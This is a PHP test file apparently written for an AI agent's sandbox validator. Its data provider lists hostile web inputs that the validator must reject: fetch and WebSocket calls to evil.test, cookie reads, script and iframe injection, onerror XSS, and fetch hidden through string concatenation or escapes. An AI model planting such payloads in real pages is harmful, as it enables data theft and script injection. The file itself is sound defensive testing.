<?php

use App\Domain\AgenteMozi\ContextoAgente;
use App\Domain\AgenteMozi\Demo\RespondedorDemo;
use App\Domain\AgenteMozi\Demo\VistaCoberturaDemo;
use App\Domain\AgenteMozi\DTOs\ArtefactoPropuesto;
use App\Domain\AgenteMozi\DTOs\DatasetPropuesto;
use App\Domain\AgenteMozi\Lienzo\ArtefactoInvalido;
use App\Domain\AgenteMozi\Lienzo\ValidadorLienzo;
use App\Domain\AgenteMozi\Lienzo\ValidadorSandboxWeb;
use App\Enums\TipoArtefacto;
use App\Livewire\AgenteMozi\Panel;

/*
 * Agente Mozi · Fase 1: el servidor reconstruye cada artefacto desde claves permitidas y rechaza el
 * código sandbox_web que intente red, navegación, almacenamiento, eval o elementos activos (§ 6.4).
 */

function vistaSegura(array $cambios = []): array
{
    return $cambios + ['html' => '<div id="raiz"></div>', 'css' => '#raiz{color:var(--text)}', 'js' => 'var r = document.getElementById("raiz"); r.textContent = "ok";'];
}

function datasetCobertura(array $filas = [['producto' => 'Arroz', 'dias' => '3.0', 'unidades' => 6]]): DatasetPropuesto
{
    return new DatasetPropuesto('d', [
        ['field' => 'producto', 'label' => 'Producto', 'type' => 'string'],
        ['field' => 'dias', 'label' => 'Días', 'type' => 'number', 'nullable' => true],
        ['field' => 'unidades', 'label' => 'Unidades', 'type' => 'integer'],
    ], $filas, ['quality' => 'demo', 'synthetic' => true]);
}

test('the demo isolated view passes the sandbox validator', function () {
    $limpio = app(ValidadorSandboxWeb::class)->validar(VistaCoberturaDemo::spec());

    expect($limpio['html'])->not->toBe('')
        ->and($limpio['js'])->toContain('mozi.onData');
});

test('sandbox code that tries network, navigation, storage or eval is rejected', function (string $campo, string $codigo) {
    expect(fn () => app(ValidadorSandboxWeb::class)->validar(vistaSegura([$campo => $codigo])))
        ->toThrow(ArtefactoInvalido::class);
})->with([
    'fetch' => ['js', 'fetch("https://evil.test/?d=" + 1)'],
    'xhr' => ['js', 'new XMLHttpRequest()'],
    'websocket' => ['js', 'new WebSocket("wss://evil.test")'],
    'beacon' => ['js', 'navigator.sendBeacon("/x", "d")'],
    'location' => ['js', 'location.href = "https://evil.test"'],
    'window location' => ['js', 'window.location = "x"'],
    'top' => ['js', 'top.document'],
    'parent' => ['js', 'parent.postMessage("x", "*")'],
    'open' => ['js', 'open("https://evil.test")'],
    'cookie' => ['js', 'var c = document.cookie'],
    'storage' => ['js', 'localStorage.getItem("x")'],
    'eval' => ['js', 'eval("1+1")'],
    'function constructor' => ['js', 'new Function("return 1")()'],
    'constructor chain' => ['js', '[].map.constructor("return 1")()'],
    'string access' => ['js', 'window["fe" + "tch"]("x")'],
    'unicode escape' => ['js', '\\u0066etch("x")'],
    'hex escape' => ['js', 'var s = "\\x66etch"'],
    'innerHTML' => ['js', 'document.body.innerHTML = "<img src=x>"'],
    'script element' => ['js', 'document.createElement("script")'],
    'iframe element' => ['js', "document.createElement('iframe')"],
    'dynamic import' => ['js', 'import("https://evil.test/x.js")'],
    'closing script' => ['js', 'var a = "</script>"'],
    'script tag' => ['html', '<script>alert(1)</script>'],
    'iframe tag' => ['html', '<iframe></iframe>'],
    'meta refresh' => ['html', '<meta http-equiv="refresh" content="0;url=https://evil.test">'],
    'form' => ['html', '<form><button>Enviar</button></form>'],
    'inline handler' => ['html', '<img onerror="alert(1)">'],
    'image source' => ['html', '<img src="https://evil.test/p.png">'],
    'link' => ['html', '<a href="https://evil.test">x</a>'],
    'javascript url' => ['html', '<div title="javascript:alert(1)"></div>'],
    'css import' => ['css', '@import url(https://evil.test/x.css);'],
    'css remote image' => ['css', 'body{background:url(https://evil.test/p.png)}'],
    'css protocol relative' => ['css', 'body{background:url(//evil.test/p.png)}'],
    'css closing style' => ['css', '</style><script>alert(1)</script>'],
]);

test('sandbox code over the size limits or with control characters is rejected', function () {
    $validador = app(ValidadorSandboxWeb::class);
    $limite = (int) config('agente_mozi.limites.sandbox_js_bytes');

    expect(fn () => $validador->validar(vistaSegura(['js' => str_repeat('a', $limite + 1)])))->toThrow(ArtefactoInvalido::class)
        ->and(fn () => $validador->validar(vistaSegura(['js' => "var a = 1;\u{0000}"])))->toThrow(ArtefactoInvalido::class)
        ->and(fn () => $validador->validar(vistaSegura(['html' => ''])))->toThrow(ArtefactoInvalido::class);
});

test('the sandbox switch rejects every isolated view', function () {
    config(['agente_mozi.sandbox_web' => false]);

    expect(fn () => app(ValidadorSandboxWeb::class)->validar(VistaCoberturaDemo::spec()))->toThrow(ArtefactoInvalido::class);
});

test('every demo answer produces only valid datasets and canvas items', function () {
    [, $admin] = empresaConAdministrador();
    $contexto = ContextoAgente::desde($admin);
    $validador = app(ValidadorLienzo::class);

    foreach (Panel::SUGERENCIAS as $pregunta) {
        $respuesta = app(RespondedorDemo::class)->responder($contexto, $pregunta);
        $datasets = [];

        foreach ($respuesta->datasets as $propuesto) {
            $datasets[$propuesto->clave] = $validador->dataset($propuesto);
        }

        foreach ($respuesta->artefactos as $propuesto) {
            $limpio = $validador->artefacto($propuesto, $propuesto->dataset === null ? null : $datasets[$propuesto->dataset]);
            expect($limpio['meta']['quality'])->toBe('demo');
        }

        expect($respuesta->artefactos)->not->toBeEmpty("Sin artefactos para: {$pregunta}");
    }
});

test('datasets reject floats, unknown fields, bad names and oversized payloads', function (array $filas) {
    expect(fn () => app(ValidadorLienzo::class)->dataset(datasetCobertura($filas)))->toThrow(ArtefactoInvalido::class);
})->with([
    'float' => [[['producto' => 'Arroz', 'dias' => 3.5, 'unidades' => 6]]],
    'unknown field' => [[['producto' => 'Arroz', 'dias' => '3.0', 'unidades' => 6, 'extra' => 'x']]],
    'decimal in integer' => [[['producto' => 'Arroz', 'dias' => '3.0', 'unidades' => '6.5']]],
    'null in required' => [[['producto' => null, 'dias' => '3.0', 'unidades' => 6]]],
]);

test('datasets with too many rows or invalid column names are rejected', function () {
    $validador = app(ValidadorLienzo::class);
    $limite = (int) config('agente_mozi.limites.filas_dataset');

    expect(fn () => $validador->dataset(datasetCobertura(array_fill(0, $limite + 1, ['producto' => 'A', 'dias' => '1', 'unidades' => 1]))))
        ->toThrow(ArtefactoInvalido::class)
        ->and(fn () => $validador->dataset(new DatasetPropuesto('d', [['field' => 'Mal Nombre', 'label' => 'X', 'type' => 'string']], [], [])))
        ->toThrow(ArtefactoInvalido::class)
        ->and(fn () => $validador->dataset(new DatasetPropuesto('d', [['field' => 'x', 'label' => 'X', 'type' => 'html']], [], [])))
        ->toThrow(ArtefactoInvalido::class);
});

test('canvas items are rebuilt from allowed keys and must reference real, compatible columns', function () {
    $validador = app(ValidadorLienzo::class);
    $dataset = $validador->dataset(datasetCobertura());

    $limpio = $validador->artefacto(new ArtefactoPropuesto(TipoArtefacto::Grafico, 'Cobertura', 'd', [
        'chart_type' => 'bar', 'x_field' => 'producto', 'series' => [['field' => 'dias', 'label' => 'Días']],
        'onclick' => 'alert(1)', 'html' => '<b>x</b>',
    ]), $dataset);

    expect($limpio['spec'])->not->toHaveKeys(['onclick', 'html'])
        ->and($limpio['spec']['chart_type'])->toBe('bar');

    $invalidos = [
        [TipoArtefacto::Grafico, ['chart_type' => 'bar', 'x_field' => 'producto', 'series' => [['field' => 'no_existe', 'label' => 'X']]]],
        [TipoArtefacto::Grafico, ['chart_type' => 'bar', 'x_field' => 'producto', 'series' => [['field' => 'producto', 'label' => 'Texto']]]],
        [TipoArtefacto::Grafico, ['chart_type' => 'radar', 'x_field' => 'producto', 'series' => [['field' => 'dias', 'label' => 'X']]]],
        [TipoArtefacto::Tabla, ['columns' => [['field' => 'no_existe', 'label' => 'X']]]],
        [TipoArtefacto::Kpi, ['field' => 'producto']],
    ];

    foreach ($invalidos as [$tipo, $spec]) {
        expect(fn () => $validador->artefacto(new ArtefactoPropuesto($tipo, 'X', 'd', $spec), $dataset))->toThrow(ArtefactoInvalido::class);
    }

    expect(fn () => $validador->artefacto(new ArtefactoPropuesto(TipoArtefacto::Kpi, 'X', null, ['field' => 'dias']), null))
        ->toThrow(ArtefactoInvalido::class);
});

test('metadata only accepts known qualities, BOB and valid dates', function () {
    $validador = app(ValidadorLienzo::class);

    expect($validador->meta(['quality' => 'estimated', 'currency' => 'BOB', 'period' => ['from' => '2026-10-01', 'to' => '2026-10-07']]))
        ->toMatchArray(['quality' => 'estimated', 'currency' => 'BOB'])
        ->and(fn () => $validador->meta(['quality' => 'garantizado']))->toThrow(ArtefactoInvalido::class)
        ->and(fn () => $validador->meta(['currency' => 'USD']))->toThrow(ArtefactoInvalido::class)
        ->and(fn () => $validador->meta(['period' => ['from' => '07/10/2026', 'to' => '2026-10-08']]))->toThrow(ArtefactoInvalido::class);
});
